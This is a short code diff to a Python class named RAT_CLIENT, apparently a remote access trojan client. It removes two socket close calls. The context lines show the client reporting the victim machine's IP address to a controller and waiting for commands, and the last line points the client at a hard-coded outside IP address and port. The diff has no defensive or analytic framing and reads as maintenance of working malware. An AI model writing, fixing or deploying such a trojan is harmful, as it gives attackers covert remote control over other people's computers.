@@ -50,7 +50,6 @@ class RAT_CLIENT:
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 print (sending)
-                s.close()
                 command = s.recv(1024).decode()
                 if command == 'recibido':
                     connected = True
@@ -89,7 +88,6 @@ class RAT_CLIENT:
 
             elif command == 'exitt':
                 s.send(b"exit")
-                s.close()
                 break
 
 rat = RAT_CLIENT('138.68.79.95', 1431)
